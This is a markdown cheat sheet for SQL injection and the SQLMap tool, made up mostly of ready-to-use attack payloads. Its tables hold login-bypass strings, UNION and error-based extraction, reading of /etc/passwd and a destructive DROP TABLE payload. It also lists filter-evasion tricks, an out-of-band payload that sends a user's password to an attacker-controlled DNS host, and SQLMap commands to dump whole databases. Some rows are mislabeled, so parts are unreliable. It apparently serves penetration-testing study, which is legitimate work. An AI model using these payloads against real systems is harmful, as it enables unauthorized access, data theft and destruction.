# SQLMap: Automated SQL Injection Summary

**Reference**:

- SQLMap: [App](https://sqlmap.org/), [GitHub](https://github.com/sqlmapproject/sqlmap/), [Wiki](https://github.com/sqlmapproject/sqlmap/wiki/usage)

### 1. SQL Injection (SQLi) Fundamentals

SQL injection occurs when user input is improperly sanitized, allowing an attacker to manipulate the SQL queries sent to a Database Management System (DBMS).

- **Core Mechanism**: Attackers leverage SQL queries to perform unauthorized actions such as retrieving, modifying, or deleting sensitive data.
- **Authentication Bypass Example**: Injecting the string `' OR 1=1;-- -` into a login field can force a database to return a "True" condition, logging in without a valid password.
- **Impact**: Successful attacks can compromise critical organizational data and lead to full database takeovers.

### 2. SQL Injection Payload Matrix

#### A. Authentication Bypass Matrix (Login-Based)

_Use these payloads in **Login Forms** (Username/Password fields) to force a "True" condition and bypass the password check._

| Type            | User / id                           | Pass                   | Resulting SQL Statement / Payload                                             |
| :-------------- | :---------------------------------- | :--------------------- | :---------------------------------------------------------------------------- |
| Query           | `abc`                               | `abc123`               | `SELECT * FROM users WHERE username = 'abc' AND password = 'abc123';`         |
| Basic Bypass    | `admin' --`                         | `any`                  | Logs in as 'admin' by commenting out the password check.                      |
| Double Quote    | `admin" --`                         | `any`                  | Used if the back-end query uses double quotes (`"`) instead of single (`'`)   |
| Blank Password  | `admin`                             | `' OR ''='`            | When username is known, injecting an `OR` condition into the password field   |
| Auth Bypass     | `abc`                               | `abc' OR 1=1;-- -`     | Forces the query to return a "True" result by using the OR 1=1                |
| Tautology       | `' OR 1=1 --` or `admin' OR '1'='1` | `any` or `' OR '1'='1` | Forces the query to be True; logs in as the first user (usually Admin).       |
| Logic Bypass    | `admin' #`                          | `any`                  | Comment out the rest of the query, ignoring the password requirement.         |
| Brackets Bypass | `admin') OR ('1'='1`                | `any`                  | Closes any open parentheses in the developer's original query.                |
| OR Bypass       | `admin' \|\| '1'='1`                | `any`                  | Uses double-pipe (`\|\|`) logical OR operator to validate username as "True," |
| GPC Bypass      | `admin%df' --`                      | `any`                  | Uses multi-byte characters (GBK encoding) to bypass slash escaping.           |

#### B. Data Extraction & Logic Matrix (Parameter-Based)

_Use these payloads in **URLs** after the first parameter `?id=1` or **Search Bars**. The goal here is to extract data or confirm vulnerabilities, NOT to log in._

| Type                     | Payload to Append                                             | Objective / Logic                                                      |
| :----------------------- | :------------------------------------------------------------ | :--------------------------------------------------------------------- |
| Column Count             | `' ORDER BY 5 --`                                             | Finds how many columns exist (increase # until an error occurs).       |
| Numeric Bypass           | `105 OR 1=1`                                                  | Used for numeric fields without quotes.                                |
| Boolean (True)           | `' AND 1=1 --`                                                | Page loads normally. Confirms you have logic control (True).           |
| Boolean (False)          | `' AND 1=2 --`                                                | Page returns "No Results." Confirms logic control (False).             |
| UNION Extract            | `' UNION SELECT 1,2,user() --`                                | Appends the database user's name directly into the web page.           |
| Version Grab             | `' UNION SELECT 1,@@version,3 --`                             | Displays the Database version (MySQL/MSSQL).                           |
| Error-Based Generic      | `' AND ExtractValue(1, CONCAT(0x7e, (SELECT DATABASE()))) --` | Forces the DB name into a visible error message.                       |
| Error-Based ExtractValue | `' AND EXTRACTVALUE(1,0x5c) --`                               | Forces the DB to return sensitive info inside a visible error message. |
| Time-Based               | `' AND SLEEP(5) --`                                           | Forces a 5-second delay. Used when no data or errors are visible.      |
| Stacked Query            | `; DROP TABLE users; --`                                      | Executes a second command to delete data (Requires API support).       |
| File Read                | `' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3 --`              | Reads system files directly from the server (Linux).                   |
| Out-of-Band              | `' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) --`                | Alternative timing check for blind environments.                       |
| Subquery Exfil           | `' AND (SELECT 1)=1 --`                                       | Extracts data by testing if specific subqueries return "True".         |

#### General Key Techniques and Tricks:

- **Comment Characters**: Different DBMS systems use different comment syntax. Common variants include `-- -` (MySQL/PostgreSQL), `#` (MySQL), or `/*` (Multi-line).
- **Logical Operators**: Using `OR` or `AND` allows attackers to manipulate the logic of the `WHERE` clause to either force a "True" state or filter specific database records.
- **The Single Quote (`'`)**: The most critical character in manual testing; it is used to break out of the intended data string and introduce malicious SQL logic.
- **Blind SQLi**: When the application does not return direct data or errors, attackers use Boolean (True/False behavior) or Time (Response delay) triggers to exfiltrate data bit-by-bit.
- **Case Variation**: If the filter looks for `SELECT`, use `sElEcT` or `SELselectECT`.
- **Inline Comments**: Breaking up keywords like `UNI/**/ON/**/SEL/**/ECT` to bypass string-matching filters.
- **URL Encoding**: Encoding characters like `'` as `%27` or space as `%20` or `+`.
- **Hex Encoding**: Using `0x` notation (e.g., `0x5c` for a backslash) to provide data without using quotes.
- **Double Encoding**: Encoding the payload twice (e.g., `%2527`) if the server decodes input twice before processing.
- **White Space Bypass**: Using tabs (`%09`), newlines (`%0a`), or comments `/**/` instead of standard spaces.
- **Second-Order SQLi**: You sign up with the username `admin'--`. Later, when you change your password, the "Update Password" query sees your username and accidentally changes the password for the _real_ admin.
- **Out-of-Band (OOB)**: This is used when you cannot see any response on the page (Blind) and Time-based is too slow. Force the database to make an external network request (DNS or HTTP) to a server you control. `LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 0,1),'.your-attacker-dns.com\\a'))`

### 3. SQLMap Workflow & Command Reference

SQLMap is an open-source command-line tool that automates the process of detecting and exploiting SQL injection flaws.

#### A. Establishing the Connection

SQLMap can test targets through different HTTP methods depending on how the application processes data.

| Scenario      | Command                                   | Notes                                                          |
| :------------ | :---------------------------------------- | :------------------------------------------------------------- |
| GET Request   | `sqlmap -u "http://target.com/page?id=1"` | Use for visible URL parameters.                                |
| POST Request  | `sqlmap -r request.txt`                   | Capture the login/form request in Burp Suite and save to file. |
| Hidden Params | (Use Browser Network Tab)                 | Identify AJAX/API calls usually hidden from the address bar.   |

#### B. The Extraction Workflow

_Once connected, follow this hierarchy to dump data:_

1.  **List Databases**: `sqlmap -u <URL> --dbs`
2.  **List Tables**: `sqlmap -u <URL> -D <db_name> --tables`
3.  **Dump Data**: `sqlmap -u <URL> -D <db_name> -T <table_name> --dump`

#### C. Strategic Flag Selection

_Use these flags to overcome specific obstacles._

| Goal          | Flag              | Description                                                                 |
| :------------ | :---------------- | :-------------------------------------------------------------------------- |
| Basic Target  | `-u <URL>`        | Defines the target URL for GET parameters.                                  |
| Target DB     | `-D <db_name>`    | Specifies the database to work within.                                      |
| Target Table  | `-T <table_name>` | Specifies the table to work within.                                         |
| Extract DB    | `--dbs`           | Extract all the database names.                                             |
| Extract Table | `--tables`        | Extract information about the tables.                                       |
| Extract Data  | `--dump`          | Dumps all data from the selected table.                                     |
| Complexity    | `--level=5`       | Increases payload complexity and thoroughness.                              |
| Risk          | `--risk`          | More "heavy" or potentially destructive payloads (1-3, default 1)           |
| Beginner      | `--wizard`        | Guided simple mode.                                                         |
| Batch Mode    | `--batch`         | Never ask for user input and use the default behavior for every question    |
| Post Exploit  | `--sql-shell`     | provides an interactive terminal to run custom SQL queries                  |
| Proxy         | `--proxy`         | To monitor traffic through Burp Suite use `--proxy="http://127.0.0.1:8080"` |
| Tamper        | `--tamper`        | Applies obfuscation tricks to every payload (ex. `--tamper=space2comment`). |
| Technique     | `--technique`     | Focus on the known vulnerabilities, `--technique=U` for Union attacks       |
| Reset Session | `--flush-session` | Forces a fresh scan if SQLMap needs to get ride of old, cached results      |

### 4. Practical Tips

- **Terminal Errors**: Always wrap the URL in single quotes (`'`) to prevent the terminal from misinterpreting special characters like `?` or `&` as shell commands.
- **URL Capture**: For hidden GET requests (like those triggered by AJAX/Login), use the browser network tab (F12) to capture the full URL and parameters.
- **WAF/IDS Detection**: SQLMap automatically checks for Web Application Firewalls or Intrusion Detection Systems during the initial connection phase.
